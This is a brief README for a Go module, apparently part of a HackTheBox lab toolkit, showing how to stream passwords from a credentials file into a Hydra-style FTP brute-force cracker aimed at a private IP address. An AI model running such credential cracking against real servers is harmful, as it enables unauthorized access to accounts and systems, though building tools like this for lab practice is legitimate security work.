# CredManager Module

## Example Usage
```go
logger := ElasticLog.NewElasticLogger("defaultIndex")
var wg sync.WaitGroup

tracker := CredManager.NewCredFileTracker("/home/harsh/Desktop/HackTheBox/test/credentials.txt")
go tracker.Track() // Runs as a daemon thread (not listed on waitGroup)

newCracker := Hydra.NewLibHydraModule("192.168.1.1:21",tracker.GetTrackerCredChannel(),1,logger,&wg)
newCracker.AttachModule(&Hydra.FTPCrack{})
newCracker.StartCracking() // adds active threads on parentWaitGroup

go func(){
    // time to stop
    time.Sleep(time.Minute)
    fmt.Println("\nKilling tracker")
    tracker.KillTracker() // killing the tracker also kills all associated hydra threads
}()

wg.Wait()
```